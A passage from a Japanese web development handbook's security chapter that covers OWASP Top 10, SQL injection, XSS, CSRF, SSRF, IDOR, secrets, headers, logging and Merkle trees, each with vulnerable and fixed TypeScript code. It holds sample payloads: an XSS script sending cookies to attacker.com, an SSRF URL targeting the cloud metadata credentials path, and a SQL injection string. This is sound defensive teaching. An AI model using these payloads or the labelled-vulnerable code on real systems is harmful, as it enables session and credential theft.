# 第VI部 品質と非機能要件

第V部までで、アプリケーションを実装し、データを保持し、環境へ配置し、変更を届け、その結果を観測するところまで扱った。しかし、観測できることと、利用者へ安全で速く安定したサービスを提供できることは同じではない。入力や依存を悪用されれば正しい機能が攻撃手段になり、処理が遅ければ機能は事実上利用できず、変更の検証手段がなければ改善そのものが新しい障害を生む。

第VI部では、品質を後付けの確認項目ではなく、設計を制約する連続した判断として扱う。まずセキュリティで守る資産と信頼境界を定め、次にパフォーマンスで利用者が待つ経路を測る。テストによってその性質を変更後も検証可能にし、最後に負荷増大と部分障害へ耐えるアーキテクチャへ広げる。守る、測る、確かめる、耐えるという四つの責任をつなぐことが、この部の目標である。

---

<a id="chapter-23"></a>
## 第23章 セキュリティ

第V部では、ログ、メトリクス、トレースを用いて本番の振る舞いを追えるようになった。しかし、観測対象の処理そのものが攻撃者に操作され、認証情報やデータが盗まれれば、正常に動いているように見えるシステムでも利用者の信頼を失う。運用監視だけでは、誰を信頼し、どの入力を拒み、どの資産を守るべきかは決められない。

本章では、資産、攻撃面、信頼境界を起点に、入力、出力、認証、認可、秘密、依存、通信路、供給網を多層で守る。利用者から預かったファイルは、受理・処理・配信という3つの寿命を持つ入力であり、これも同じ枠組みで扱う。個別の脆弱性名を暗記するのではなく、攻撃者が境界を越える経路と、防御が失敗したときの影響を結び付ける。第24章では、安全性を保ったシステムが、利用者の待ち時間と負荷条件を満たしているかを測る。
<!-- handbook:chapter-guide:start {"chapter":23} -->
> **この章の学習ガイド**
>
> **解決する実務上の問題**  
> 入力、認証、依存、設定、サプライチェーンの弱点を、攻撃者の経路と資産の価値から優先順位付けして防ぐ。
>
> **到達目標**
> - 主要なWeb脆弱性の原因と防御境界を説明できる。
> - 認証・認可・秘密・依存・ヘッダ・ログを多層で設計できる。
> - 発展的な暗号・完全性技術を必要条件と成熟度で評価できる。
> - アップロードされたバイト列を、受理・処理・配信の3段階で検証できる。
> - 自動化された要求を意図で分け、識別・振る舞い・チャレンジの段階とレート制限で扱える。
>
> 到達目標は章全体に対するものである。標準通読ルートは必修節だけを読むため、下の「中核概念」に (実務選択) (発展) (展望) と付いた節がある章では、その節を読むまで到達目標の一部が埋まらない。必修節を読み終えた時点で説明できない項目があれば、まず付記のある節へ進む。
>
> **前提知識**
> - [13.12 セキュリティの基本原則 (まとめ)](04-part3-backend.md#section-13-12) ― 認証・認可の基本原則
> - [21.2 GitHub Actions](06-part5-infrastructure.md#section-21-2) ― CIの供給網
>
> **中核概念**  
> [23.1 OWASP Top 10 (2021)](#section-23-1)、[23.2 SQLインジェクション](#section-23-2)、[23.3 XSS (Cross-Site Scripting)](#section-23-3)、[23.5 SSRF (Server-Side Request Forgery)](#section-23-5)、[23.6 認証関連の脆弱性](#section-23-6)、[23.7 IDOR (Insecure Direct Object References)](#section-23-7)、[23.9 シークレット管理](#section-23-9)、[23.10 依存パッケージの脆弱性](#section-23-10)、[23.11 セキュアヘッダ](#section-23-11)、[23.26 アップロードされたファイルの検証 ― MIME偽装、サイズ制限、スキャン](#section-23-26) (実務選択)、[23.27 自動化された脅威 ― bot、スパム、レート制限の設計](#section-23-27) (実務選択)
>
> **最小実装**  
> [23.28 実装課題 ― セキュリティを攻撃と防御の両面で学ぶ](#section-23-28) (実務選択)
>
> **本番実装との差分**
> - 脆弱コードはlocalhostまたは隔離環境だけで実行する。教材の防御例も完全な認証・監査・秘密管理を代替しない。
>
> **典型的な失敗**
> - 入力検証だけで認可を代替する。
> - 暗号アルゴリズムを自作する。
> - スキャン結果をリスク評価なしで放置または全受容する。
> - 申告された種別や拡張子を根拠に受理する。
> - 利用者コンテンツを本体と同じオリジンから配信する。
> - IPアドレスだけを鍵にし、共有IPの正規利用者を巻き込みつつ分散した攻撃を通す。
> - CAPTCHAを全員に常時課し、代替手段を用意しないまま一部の利用者を締め出す。
>
> **診断・デバッグ方法**
> - 攻撃面、資産、信頼境界、ログを整理して再現する。
> - SAST/DAST/SCA結果を手動検証し、修正後に再試験する。
> - 受理の拒否理由を種別ごとに集計し、正当な利用の巻き添えを見分ける。
> - 拒否件数と巻き添えの両方を測り、検知モードでしきい値を確認してから拒否へ切り替える。
>
> **意思決定チェックリスト**
> - 脅威モデルで最も価値の高い資産は何か。
> - 防御はどの信頼境界で実施するか。
> - 仕様成熟度と移行コストは。
> - 受理する形式ごとに、再エンコード・隔離解析・拒否のどれをデフォルトにするか。
> - 止めたい自動化と歓迎する自動化をどう識別するか。チャレンジの代替手段は何か。
>
> **演習と評価基準**  
> 対象: [23.28 実装課題 ― セキュリティを攻撃と防御の両面で学ぶ](#section-23-28) (実務選択)
> - 攻撃と防御を対にして実行し、検出・防止・影響低減を区別できる。
> - 偽装した検体を受理させたうえで、判定の差し替えだけで通らなくなることを示せる。
> - 鍵の設計を誤ったレート制限を再現し、層を重ねると通らなくなることを示せる。
>
> **一次資料・発展資料**
> - OWASP Top 10:2025
> - OWASP ASVS
> - NIST cryptographic standards
> - SLSA v1.2
> - OWASP File Upload Cheat Sheet
> - OWASP Automated Threats to Web Applications
> - RFC 6585 Additional HTTP Status Codes
<!-- handbook:chapter-guide:end -->

<a id="section-23-1"></a>
### 23.1 OWASP Top 10 (2021)
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"O","term":"OWASP Top 10"} -->

<!-- handbook:narrative-bridge {"section":"23.1"} -->
第V部の可観測性は、起きた事象を追跡する基盤を与えた。次に必要なのは、何を脅威として扱うかの共通語彙である。OWASP Top 10を入口にすると、個別バグを資産、攻撃面、信頼境界の問題へ整理できる。

主要なWebアプリ脆弱性のランキング [OWASP, 2021]。本節から 23.13 までは、この2021年版の並びに沿って一つずつ攻撃と防御を見ていく。

現行版は2025年に更新された [OWASP, 2025]。分類の考え方は変わっていないが、次の点が動いている。読み終えたあとに現行版と突き合わせ、自分の担当システムでどのカテゴリが重いかを確認してほしい。

- 依存パッケージの問題が「Software Supply Chain Failures」へ広がり、ビルドと配布の経路まで対象に入った (23.10)
- 例外処理の誤りが独立したカテゴリとして加わった
- SSRF は独立カテゴリではなくなり、アクセス制御の一部として扱われるようになった (23.5 の内容自体は現行でも有効である)

1. **Broken Access Control** (壊れたアクセス制御)
2. **Cryptographic Failures** (暗号化の失敗)
3. **Injection** (インジェクション)
4. **Insecure Design** (安全でない設計)
5. **Security Misconfiguration** (設定ミス)
6. **Vulnerable and Outdated Components** (脆弱な依存)
7. **Identification and Authentication Failures** (認証の失敗)
8. **Software and Data Integrity Failures** (整合性の失敗)
9. **Security Logging and Monitoring Failures** (ログ・監視の失敗)
10. **Server-Side Request Forgery (SSRF)**

これらを順に攻撃・防御していく。

<a id="section-23-2"></a>
### 23.2 SQLインジェクション
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"S","term":"SQLインジェクション"} -->

<!-- handbook:narrative-bridge {"section":"23.2"} -->
脅威を分類しただけでは、入力がどのように命令へ変わるかは見えない。まず、値とSQL構造の境界が崩れるインジェクションを具体例に、データとコードを分離する原則を確認する。

最古典的にして最も致命的な脆弱性の一つ。

**脆弱なコード:**

```typescript
// BAD: 文字列連結でクエリを組み立て
async function findUser(email: string) {
  return db.$queryRawUnsafe(
    `SELECT * FROM users WHERE email = '${email}'`
  );
}

// 攻撃例: email に ' OR '1'='1 を入れる
findUser("' OR '1'='1");
// 生成されるSQL: SELECT * FROM users WHERE email = '' OR '1'='1'
// → 全ユーザーが返る
```

**安全なコード:**

```typescript
// GOOD: パラメータ化クエリ (プリペアドステートメント)
async function findUser(email: string) {
  return db.$queryRaw`SELECT * FROM users WHERE email = ${email}`;
  // または
  return db.user.findUnique({ where: { email } });
}
```

パラメータ化クエリでは、値とSQL構造が完全に分離されるため、いかなる入力もSQL文として解釈されない。**「ユーザー入力を文字列としてSQLに混ぜない」が鉄則**。

ORMを使えば自然と安全になる。生SQL を書くときは必ず `$queryRaw` (テンプレートリテラル形式) を使い、`$queryRawUnsafe` (文字列連結) は避ける。

<a id="section-23-3"></a>
### 23.3 XSS (Cross-Site Scripting)
<!-- handbook:learning {"level":"required","minutes":10} -->
<!-- handbook:index {"group":"C","term":"CSP (Content Security Policy)"} -->
<!-- handbook:index {"group":"D","term":"DOMPurify"} -->
<!-- handbook:index {"group":"X","term":"XSS (Cross-Site Scripting)"} -->
<!-- handbook:index {"group":"か行","term":"コンテンツセキュリティポリシー (CSP)"} -->

<!-- handbook:narrative-bridge {"section":"23.3"} -->
SQLをパラメータ化しても、同じ入力がHTMLやJavaScriptの文脈へ出力されれば、今度はブラウザで命令として実行されうる。XSSは、入力検証だけでなく出力先の文脈に応じたエスケープが必要な理由を示す。

ユーザー入力を画面に表示する際、JavaScriptとして実行されてしまう脆弱性。

**Reflected XSS:**

```html
<!-- 脆弱: URLパラメータをそのまま表示 -->
<p>検索結果: <%= request.query.q %></p>

<!-- 攻撃: ?q=<script>fetch('//attacker.com?cookie='+document.cookie)</script> -->
```

**Stored XSS:**

```typescript
// 脆弱: ユーザー投稿をそのまま表示
const post = await db.post.findUnique({ where: { id } });
res.send(`<div>${post.body}</div>`);

// 攻撃者が投稿に <script>悪意あるコード</script> を埋め込み、
// 全閲覧者で実行される (より深刻)
```

**対策1: 出力時にエスケープ**

```typescript
function escape(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

res.send(`<div>${escape(post.body)}</div>`);
```

ReactやVueなど現代フレームワークは**デフォルトで自動エスケープ**する。`{userInput}` は安全。ただし `dangerouslySetInnerHTML` (React) や `v-html` (Vue) を使うと無効化される。

**対策2: HTMLを許可するならサニタイズ**

リッチテキスト投稿 (記事、コメント) で `<b>` や `<a>` を許可したい場合:

```typescript
import DOMPurify from 'isomorphic-dompurify';

const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
});
```

**対策3: Content Security Policy (CSP)**

ブラウザにスクリプト実行ポリシーを伝える防御層。

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{ランダム}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  style-src 'self';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```

- `script-src 'nonce-{ランダム}'`: そのnonceを持つスクリプトだけ実行する。**nonceはレスポンスごとに暗号論的乱数で生成する。** 固定値や推測できる値にすると、攻撃者が同じ値を書くだけで通ってしまい、CSPが防御として成立しない
- `'strict-dynamic'`: nonceで許可したスクリプトが動的に読み込むスクリプトも許す。これを付けると、ブラウザは `'self'` のような許可リストを無視するようになる。許可リストは、同一オリジンに攻撃者の制御できる応答 (アップロードされたファイル、JSONP風のエンドポイント) が1つでもあると迂回されるため、無くす方が安全である
- `object-src 'none'`: `<object>` や `<embed>` による実行を止める。指定しないと `default-src` から漏れる経路が残る
- `base-uri 'none'`: `<base>` タグの注入を止める。これが無いと、攻撃者が `<base href="//evil.example">` を差し込んで相対パスのスクリプト読み込み先を丸ごと乗っ取れる
- `frame-ancestors 'none'`: iframe での埋め込み禁止 (clickjacking 対策)

CSPは「**もしXSSが見つかっても、攻撃の幅を制限する**」最後の壁。

<a id="section-23-4"></a>
### 23.4 CSRF (再掲)
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"C","term":"CSRF"} -->

<!-- handbook:narrative-bridge {"section":"23.4"} -->
XSSでは攻撃コードが同一オリジンの権限を得た。コードを注入できなくても、認証済みブラウザに別サイトから要求を送らせることはできる。CSRFは、要求元と利用者の意思を確認する境界を扱う。

第13章で扱ったが、Top 10 と関連付けて確認。本来の防御は**CSRFトークン** (またはOriginヘッダの検証) であり、**SameSite=Lax/Strict Cookie** はその上に重ねる一枚である (13.6)。SameSite だけに頼れないのは、`Lax` がトップレベルのGET遷移を通すこと、同一サイト扱いになるサブドメインが乗っ取られた場合に効かないこと、古いブラウザが属性を無視することによる。RESTful なAPI で `Content-Type: application/json` を必須にすると、フォーム自動送信攻撃の多くは Simple Request の枠から外れて弾けるが、これも補助であって代わりにはならない。

<a id="section-23-5"></a>
### 23.5 SSRF (Server-Side Request Forgery)
<!-- handbook:learning {"level":"required","minutes":10} -->
<!-- handbook:index {"group":"S","term":"SSRF"} -->

<!-- handbook:narrative-bridge {"section":"23.5"} -->
CSRFはブラウザが自動送信する認証情報を悪用するが、サーバ自身にも内部ネットワークへ到達できる権限がある。SSRFでは、URLを単なる文字列として受け入れると、そのネットワーク権限が攻撃者の代理として使われる。

サーバが任意のURLにリクエストを送らされる脆弱性。

```typescript
// 脆弱: ユーザー指定のURLをサーバが fetch する
app.get('/proxy', async (req, res) => {
  const url = req.query.url;
  const result = await fetch(url);
  res.send(await result.text());
});

// 攻撃例: AWS Metadata Service (EC2内部) から認証情報を盗む
// /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

**対策:**

```typescript
import { URL } from 'node:url';
import dns from 'node:dns/promises';
import ipaddr from 'ipaddr.js';

async function safeFetch(input: string) {
  const url = new URL(input);
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new Error('Invalid protocol');
  }

  // DNS解決して、結果が内部IPでないことを確認
  const { address } = await dns.lookup(url.hostname);
  const ip = ipaddr.parse(address);

  // ipaddr.js の range() は private / loopback / linkLocal / uniqueLocal などを返す。
  // unicast 以外はすべて内部扱いなので、1つの条件で足りる
  if (ip.range() !== 'unicast') {
    throw new Error('Internal address blocked');
  }

  // リダイレクトを追わせない。既定の redirect: 'follow' のままだと、攻撃者が自分の
  // ホストから 302 を返すだけで上の判定を丸ごと迂回できる (Fetch 標準の既定は follow)
  const port = url.port ? `:${url.port}` : '';
  const res = await fetch(`${url.protocol}//${address}${port}${url.pathname}${url.search}`, {
    redirect: 'manual',
    signal: AbortSignal.timeout(5_000),
  });

  // 3xx なら Location を取り出し、同じ検査を通してから改めて要求する。
  // 追跡回数には上限を設ける
  if (res.status >= 300 && res.status < 400) {
    const location = res.headers.get('location');
    if (!location) throw new Error('Redirect without location');
    return safeFetch(new URL(location, url).toString());
  }
  return res;
}
```

> **この対策の限界**: 上のコードは「解決済みIPへ直接つなぐ」ため、`https:` では証明書のホスト名検証が通らない。TLS が要る場合は、URL は元のホスト名のまま使い、接続先IPを固定する `lookup` オプション付きの Agent を使う。`Host` ヘッダを `fetch` の `headers` で上書きすることはできない (Fetch 標準の forbidden request-header name として捨てられる)。リダイレクト追跡の再帰にも上限が要る。

あわせて、到達できる宛先を許可リストで絞る、送信専用のネットワークセグメントから出す、といったネットワーク側の境界を併用する。アプリ側の検査だけを頼りにしない。クラウド環境では IMDSv2 (新しい AWS Metadata API) を有効化することも重要。トークンが必要になり、SSRF からの取得が困難になる。

<a id="section-23-6"></a>
### 23.6 認証関連の脆弱性
<!-- handbook:learning {"level":"required","minutes":10} -->

<!-- handbook:narrative-bridge {"section":"23.6"} -->
入力、出力、送信先を制限しても、本人確認の手順や資格情報の管理が弱ければ、正規の経路から不正な主体が入る。ここでは認証のライフサイクル全体に残る失敗を整理する。

**タイミング攻撃:**

```typescript
// BAD: 文字列比較はタイミング攻撃に脆弱
if (userInputToken === storedToken) { /* ... */ }

// GOOD: タイミング攻撃に耐性のある比較
import { timingSafeEqual } from 'node:crypto';

function safeCompare(a: string, b: string): boolean {
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) return false;
  return timingSafeEqual(bufA, bufB);
}
```

**Brute Force / Credential Stuffing:**

漏洩したパスワードリストでログインを試行する攻撃。

```typescript
// 最小構成の例。鍵はメールアドレス1つ、対応はロック1段だけである
async function login(email: string, password: string) {
  const key = `login_attempts:${email}`;
  const attempts = await redis.incr(key);
  if (attempts === 1) await redis.expire(key, 900);  // 15分

  if (attempts > 5) {
    throw new Error('Too many attempts. Try again later.');
  }

  // 重要: ユーザーが存在しなくても同じ時間がかかるようにする
  const user = await db.user.findUnique({ where: { email } });
  // 起動時に既知の文字列から生成しておく。書式が不正だと verify が例外を投げ、
  // 存在しないアカウントだけ挙動が変わって列挙の手がかりになる
  const hash = user?.passwordHash ?? DUMMY_HASH;
  const valid = await verify(hash, password);

  if (!user || !valid) {
    throw new Error('Invalid credentials');  // ※ メッセージは「メール存在しない」と区別しない
  }

  await redis.del(key);
  return user;
}
```

「メールアドレスが存在しません」と「パスワードが違います」を区別しないのは重要 (アカウント列挙攻撃を防ぐ)。

> **注意**: この例をそのまま本番へ置いてはいけない。鍵がメールアドレス1つで、対応が固定回数のロック1段しかないためである。攻撃者は他人のメールアドレスへ5回失敗させるだけで、正規の利用者を締め出せる。1アカウントあたり数回しか試さないパスワードスプレーやCredential Stuffingにも効かない。13.1 が「固定回数での一律ロックではなく」と書いているのはこの点であり、鍵を層に分け、費用を段階的に上げる設計は [13.25 Credential Stuffing とパスワードスプレーへの対処](04-part3-backend.md#section-13-25) で扱う。ここでは、まず試行回数を数える場所があることだけを押さえればよい。

<a id="section-23-7"></a>
### 23.7 IDOR (Insecure Direct Object References)
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"I","term":"IDOR"} -->

<!-- handbook:narrative-bridge {"section":"23.7"} -->
認証は「誰か」を確かめるが、「その人がこの対象を操作できるか」までは決めない。IDORは、URLやIDを知っていることと、対象への権限を持つことを混同したときに起きる。

「直接オブジェクト参照」とも。URLでリソースIDが見えていて、他人のIDに変えると見えてしまう脆弱性。

```typescript
// 脆弱: 認証はチェックしているが、所有者は確認していない
app.get('/orders/:id', requireAuth, async (req, res) => {
  const order = await db.order.findUnique({ where: { id: req.params.id } });
  res.json(order);  // 他人の注文も見えてしまう
});

// 安全: 認可も合わせて確認
app.get('/orders/:id', requireAuth, async (req, res) => {
  const order = await db.order.findUnique({
    where: { id: req.params.id, userId: req.user.id },  // 所有者条件
  });
  if (!order) return res.status(404).end();
  res.json(order);
});
```

第13章の「認可ロジックを中央集権化する」が、この種のバグを系統的に防ぐ。

<a id="section-23-8"></a>
### 23.8 オープンリダイレクト
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"あ行","term":"オープンリダイレクト"} -->

<!-- handbook:narrative-bridge {"section":"23.8"} -->
対象ごとの認可を正しく行っても、遷移先URLを無条件に受け入れると、信頼された画面から攻撃者のサイトへ利用者を誘導できる。オープンリダイレクトでは、遷移先も信頼境界として検証する。

ユーザー指定のURLにリダイレクトする機能で、悪意あるサイトに飛ばされる。

```typescript
// 脆弱
app.get('/login', (req, res) => {
  // ログイン後、?redirect= に飛ばす
  res.redirect(req.query.redirect as string);
  // 攻撃: /login?redirect=https://phishing.com/fake-login
});

// 安全: 許可URLを制限
function safeRedirect(target: string): string {
  try {
    const url = new URL(target, 'https://myapp.com');
    // 自ドメインのみ許可
    if (url.origin === 'https://myapp.com') return url.pathname + url.search;
    return '/';
  } catch {
    return '/';
  }
}
```

OAuthの `redirect_uri` も同じ問題が出るため、事前登録URL のみ許可するのが鉄則。

<a id="section-23-9"></a>
### 23.9 シークレット管理
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"S","term":"Secret 管理"} -->
<!-- handbook:index {"group":"V","term":"Vault (HashiCorp)"} -->

<!-- handbook:narrative-bridge {"section":"23.9"} -->
要求経路を守るだけでは、DBパスワード、署名鍵、APIキーがコードやログから漏れた場合に防御を維持できない。シークレット管理は、秘密の保管、配布、更新、失効をアプリケーション本体から分離する。

**コードにシークレットを書かない:**

```typescript
// BAD
const apiKey = 'sk_live_abc123def456';

// GOOD
const apiKey = process.env.STRIPE_API_KEY!;
if (!apiKey) throw new Error('STRIPE_API_KEY is required');
```

**.env を git に入れない:**

```text
# .gitignore
.env
.env.local
*.pem
*.key
```

**漏洩したら即ローテーション:**

GitHub に push してしまったら、historyから消しても遅い (公開された瞬間にbotが回収する)。即座にキーを無効化・再発行する。

**シークレット管理サービス:**

- AWS Secrets Manager
- HashiCorp Vault
- 1Password / Doppler

CIや本番では、これらから動的に取得する。

<a id="section-23-10"></a>
### 23.10 依存パッケージの脆弱性
<!-- handbook:learning {"level":"required","minutes":5} -->

<!-- handbook:narrative-bridge {"section":"23.10"} -->
自前の秘密を適切に扱っても、実行する依存パッケージのコードが脆弱なら、同じ権限で攻撃される。依存管理では、直接書いていないコードも供給網の一部として継続的に評価する。

依存ライブラリの脆弱性が、自分のアプリの脆弱性になる。

```bash
# 監査
npm audit
npm audit fix             # 自動修正

# Dependabot (GitHub) や Renovate を有効化
# → 脆弱性のあるパッケージを自動検知 + PR作成
```

**SBOM (Software Bill of Materials):**

「自分のアプリが使っている全パッケージのリスト」を機械可読形式で持つ取り組み。サプライチェーン攻撃 (依存パッケージへの悪意ある混入) が問題視される中、米国大統領令で公的調達には SBOM 必須となるなど、注目が高まっている。

<a id="section-23-11"></a>
### 23.11 セキュアヘッダ
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"C","term":"CSP (Content Security Policy)"} -->
<!-- handbook:index {"group":"H","term":"helmet"} -->
<!-- handbook:index {"group":"H","term":"HSTS"} -->
<!-- handbook:index {"group":"さ行","term":"セキュアヘッダ"} -->

<!-- handbook:narrative-bridge {"section":"23.11"} -->
依存の更新は原因を減らすが、未知の脆弱性や設定ミスを完全には消せない。セキュアヘッダは、ブラウザに許可する挙動を明示し、問題が起きたときの到達範囲を狭める追加の境界になる。

レスポンスに付けるべきヘッダ:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
  ↓ HTTPSの強制
Content-Security-Policy: ...
  ↓ XSS の影響範囲を限定
X-Content-Type-Options: nosniff
  ↓ MIMEタイプの推測を禁止
X-Frame-Options: DENY  (または CSP の frame-ancestors)
  ↓ クリックジャッキング対策
Referrer-Policy: strict-origin-when-cross-origin
  ↓ Referer ヘッダの漏洩制御
Permissions-Policy: geolocation=(), camera=()
  ↓ ブラウザ機能の制限
```

上の例で `preload` を付けていないのは意図的である。`preload` はブラウザに同梱される事前読み込みリストへの登録申請を意味し、**登録すると取り消しはほぼできない**。解除の申請が利用者のブラウザへ届くまで数か月かかるため、HTTPS化が済んでいないサブドメインが1つでもあると、その間そのサブドメインへ到達できなくなる。まず `includeSubDomains` 付きで `max-age` を短く始め、全サブドメインのHTTPS化を確認してから `max-age` を延ばし、最後に `preload` を検討する (23.17)。

Node.js なら **helmet** ミドルウェアでまとめて設定できる。

```typescript
import helmet from 'helmet';
app.use(helmet());
```

<a id="section-23-12"></a>
### 23.12 ログとモニタリング
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"か行","term":"監査ログ"} -->

<!-- handbook:narrative-bridge {"section":"23.12"} -->
防御を配置しても、拒否、異常な試行、権限変更が記録されなければ、攻撃の発見と事後検証ができない。ログとモニタリングは、防御の成否を観測可能な事実へ変える。

セキュリティイベントは必ずログに残す。

- ログイン (成功・失敗)
- 権限変更
- 重要データのアクセス
- 設定変更
- 異常なアクセスパターン (短時間に大量、地理的に異常)

**侵入検知の例:**

```typescript
async function detectAnomalies(userId: string, ip: string) {
  // IPアドレスは多くの法域で個人データとして扱われる (22.3)。
  // 「見覚えのないIPか」の判定に必要なのは同一性だけで、値そのものではない。
  // 鍵付きハッシュにすれば、漏れても元のIPへ戻せない
  const fingerprint = hmac(process.env.IP_HASH_KEY!, ip);
  const recent = await redis.smembers(`user:${userId}:recent_ips`);
  if (recent.length > 0 && !recent.includes(fingerprint)) {
    // 新しい IP からのアクセス。国の判定にだけ生のIPを使い、保存はしない
    const country = await geoLookup(ip);
    if (country !== expectedCountry) {
      await sendSecurityEmail(userId, `Login from ${country}`);
    }
  }
  await redis.sadd(`user:${userId}:recent_ips`, fingerprint);
  // 保持期間は「異常検知に必要な期間」で決める。長く持つほど漏えい時の被害が増える
  await redis.expire(`user:${userId}:recent_ips`, 30 * 86400);
}
```

<a id="section-23-13"></a>
### 23.13 セキュリティの文化
<!-- handbook:learning {"level":"required","minutes":5} -->

<!-- handbook:narrative-bridge {"section":"23.13"} -->
ログ、スキャナ、ポリシーがあっても、例外を黙認し、所有者や修正期限が曖昧なら防御は形骸化する。セキュリティ文化は、技術的な検出を継続的な判断と改善へ接続する。

技術対策だけでは不十分。組織として:

- **脅威モデリング**: 設計時に「何が起きうるか」を洗い出す
- **コードレビューでセキュリティ観点**: 認可、入力検証、シークレット混入
- **ペネトレーションテスト**: 外部の専門家による侵入テスト
- **バグバウンティ**: 脆弱性報告に報奨金
- **インシデント対応訓練**: 漏洩した想定で手順を試す

「動くものを作って、後でセキュリティを足す」では遅い。**設計時から組み込む** (Security by Design) のが本筋。

<a id="section-23-14"></a>
### 23.14 Merkle Tree ― 大量データの完全性証明
<!-- handbook:learning {"level":"advanced","minutes":30} -->
<!-- handbook:index {"group":"M","term":"Merkle Tree"} -->
<!-- handbook:index {"group":"O","term":"ObjectLock (S3)"} -->
<!-- handbook:index {"group":"か行","term":"完全性証明 (Merkle)"} -->
<!-- handbook:index {"group":"か行","term":"監査ログ"} -->

<!-- handbook:narrative-bridge {"section":"23.14"} -->
組織的に記録を残しても、その記録自体が後から書き換えられれば監査の根拠にならない。Merkle Treeは、大量データの完全性を一つのルートハッシュへ集約し、部分的な検証を可能にする。

「**監査ログ100万件の改ざんを検知したい**」「**ファイル1000個のうちどれかが書き換わったか検証したい**」 ― このとき、全データのハッシュを毎回計算するのは現実的でない。Merkle Tree [Merkle, 1987] は、大量データの完全性を**対数時間**で検証できるデータ構造だ。

#### 基本構造

葉ノードに各データのハッシュを置き、上に向かって「**子2つのハッシュを連結し、再度ハッシュ**」を繰り返してツリーを構築する。ルートが Merkle Root。

```text
                        Root = H(H12 || H34)
                       /                    \
              H12 = H(H1 || H2)      H34 = H(H3 || H4)
              /            \         /            \
          H1=H(d1)    H2=H(d2)   H3=H(d3)    H4=H(d4)
            |           |          |           |
           d1          d2         d3          d4
```

特徴:

- **どれか1つでも改ざんされると、ルートが変わる** → 改ざん検知
- **特定データの存在証明 (Merkle Proof) が O(log N)**: ルートと「証明用のハッシュ」だけで検証可能
- **追記しやすい**: 新葉を足してルートを再計算する範囲が小さい

Git の commit ハッシュ、IPFS、Bitcoin/Ethereum のトランザクション集約、Certificate Transparency などはすべて Merkle Tree を内部で使っている。

#### 実装 ― 構築と Merkle Proof の生成・検証

```typescript
import { createHash } from 'node:crypto';

type Hash = Buffer;

function sha256(data: Buffer | string): Hash {
  return createHash('sha256').update(data).digest();
}

// 葉と内部ノードでハッシュの入力空間を分ける (ドメイン分離)。
// 分けないと、内部ノードのハッシュ2つを連結したものを「葉のデータ」として
// 与えることで、存在しない葉の証明を作れてしまう (second preimage attack)。
// RFC 6962 (Certificate Transparency) も同じ理由で 0x00 / 0x01 を前置している
function hashLeaf(data: Buffer): Hash {
  return sha256(Buffer.concat([Buffer.from('leaf:'), data]));
}

function hashPair(a: Hash, b: Hash): Hash {
  return sha256(Buffer.concat([Buffer.from('node:'), a, b]));
}

class MerkleTree {
  private levels: Hash[][] = [];

  constructor(leaves: Buffer[]) {
    if (leaves.length === 0) throw new Error('Need at least one leaf');
    // レベル 0: 葉のハッシュ
    let level = leaves.map((leaf) => hashLeaf(leaf));
    this.levels.push(level);

    // 上に向かってビルド
    while (level.length > 1) {
      const next: Hash[] = [];
      for (let i = 0; i < level.length; i += 2) {
        // 奇数個のときは最後を複製(Bitcoin方式)
        const left = level[i];
        const right = i + 1 < level.length ? level[i + 1] : level[i];
        next.push(hashPair(left, right));
      }
      this.levels.push(next);
      level = next;
    }
  }

  /** Merkle Root を取得 */
  getRoot(): Hash {
    return this.levels[this.levels.length - 1][0];
  }

  /**
   * 指定インデックスの葉に対する Merkle Proof を生成
   * proof: 検証に必要な兄弟ハッシュの列 (下から上へ)
   */
  getProof(index: number): { sibling: Hash; isRight: boolean }[] {
    if (index < 0 || index >= this.levels[0].length) {
      throw new Error('Index out of range');
    }
    const proof: { sibling: Hash; isRight: boolean }[] = [];
    let idx = index;
    for (let lv = 0; lv < this.levels.length - 1; lv++) {
      const level = this.levels[lv];
      const isLeftNode = idx % 2 === 0;
      const siblingIdx = isLeftNode ? idx + 1 : idx - 1;
      // 兄弟がない場合は自分のハッシュ(コンストラクタと同じルール)
      const sibling = siblingIdx < level.length ? level[siblingIdx] : level[idx];
      proof.push({ sibling, isRight: !isLeftNode });
      idx = Math.floor(idx / 2);
    }
    return proof;
  }
}

/** 検証側: 葉のデータ + プルーフ + ルートから一致を確認 */
function verifyProof(
  leaf: Buffer,
  proof: { sibling: Hash; isRight: boolean }[],
  expectedRoot: Hash,
): boolean {
  let current = hashLeaf(leaf);
  for (const { sibling, isRight } of proof) {
    current = isRight ? hashPair(sibling, current) : hashPair(current, sibling);
  }
  return current.equals(expectedRoot);
}

// === 使用例: 監査ログ8件の完全性証明 ===
const logs = [
  'user=alice action=login',
  'user=alice action=read file=secret.txt',
  'user=bob action=login',
  'user=bob action=delete file=record1.json',
  'user=alice action=update record=42',
  'user=admin action=role-change target=bob',
  'user=alice action=logout',
  'user=bob action=logout',
].map((s) => Buffer.from(s, 'utf8'));

const tree = new MerkleTree(logs);
const root = tree.getRoot();
console.log('Root:', root.toString('hex'));

// 「インデックス3のログ」が改ざんされていないことを証明
const targetIdx = 3;
const proof = tree.getProof(targetIdx);

// 検証側はルートとプルーフだけ持っていれば検証できる
const isValid = verifyProof(logs[targetIdx], proof, root);
console.log('Valid:', isValid); // true

// 改ざんを試みると...
const tamperedLog = Buffer.from('user=bob action=delete file=DIFFERENT.json', 'utf8');
console.log('Tampered valid:', verifyProof(tamperedLog, proof, root)); // false
```

#### 監査ログへの実用適用

